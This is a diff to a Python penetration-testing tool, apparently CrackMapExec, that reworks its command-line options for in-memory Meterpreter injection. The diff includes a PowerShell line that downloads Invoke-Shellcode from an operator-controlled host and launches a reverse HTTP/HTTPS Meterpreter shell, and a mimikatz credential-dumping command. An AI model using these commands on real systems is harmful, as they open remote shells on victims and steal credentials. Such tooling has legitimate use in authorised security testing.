@@ -2661,11 +2661,11 @@ def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurl
 
 def inject_pscommand(localip):
 
-    if args.inject == 'meterpreter':
+    if args.inject.startswith('met_'):
         command = """
         IEX (New-Object Net.WebClient).DownloadString('http://{}/Invoke-Shellcode.ps1');
         Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}""".format(localip,
-                                                                                              args.met, 
+                                                                                              args.inject[4:], 
                                                                                               args.met_options[0], 
                                                                                               args.met_options[1])
         if args.procid:
@@ -3010,12 +3010,11 @@ if __name__ == '__main__':
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
     xgroup = parser.add_argument_group("Shellcode/EXE/DLL/Meterpreter Injection", "Options for injecting Shellcode/EXE/DLL/Meterpreter in memory using PowerShell")
-    xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll', 'meterpreter'}, help='Inject Shellcode, EXE, DLL or Meterpreter')
+    xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll', 'met_reverse_https', 'met_reverse_http'}, help='Inject Shellcode, EXE, DLL or Meterpreter')
     xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems')
     xgroup.add_argument('--procid', type=int, help='Process ID to inject the Shellcode/EXE/DLL/Meterpreter into (if omitted, will inject within the running PowerShell process)')
     xgroup.add_argument("--exeargs", type=str, help='Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)')
-    xgroup.add_argument("--met", choices={'reverse_http', 'reverse_https'}, dest='met', help='Specify the Meterpreter to inject')
-    xgroup.add_argument("--met-options", nargs=2, metavar=('LHOST', 'LPORT'), dest='met_options', help='Meterpreter options')
+    xgroup.add_argument("--met-options", nargs=2, metavar=('LHOST', 'LPORT'), dest='met_options', help='Meterpreter options (ignored if not injecting Meterpreter)')
 
     bgroup = parser.add_argument_group("Filesystem Interaction", "Options for interacting with filesystems")
     bgroup.add_argument("--list", metavar='PATH', help='List contents of a directory')
@@ -3036,8 +3035,8 @@ if __name__ == '__main__':
         log.setLevel(logging.INFO)
 
     if args.inject:
-        if args.inject != 'meterpreter':
-            if not args.path: 
+        if not args.inject.startswith('met_'):
+            if not args.path:
                 print_error("You must specify a '--path' to the Shellcode/EXE/DLL to inject")
                 sys.exit(1)
 
@@ -3046,9 +3045,9 @@ if __name__ == '__main__':
                     print_error('Unable to find Shellcode/EXE/DLL at specified path')
                     sys.exit(1)
 
-        elif args.inject == 'meterpreter':
-            if not args.met_options or not args.met:
-                print_error('You must specify a Meterpreter and it\'s options using \'--met\' and \'--met-options\'' )
+        elif args.inject.startswith('met_'):
+            if not args.met_options:
+                print_error('You must specify Meterpreter\'s options using --met-options' )
                 sys.exit(1)
 
     if os.path.exists(args.target[0]):
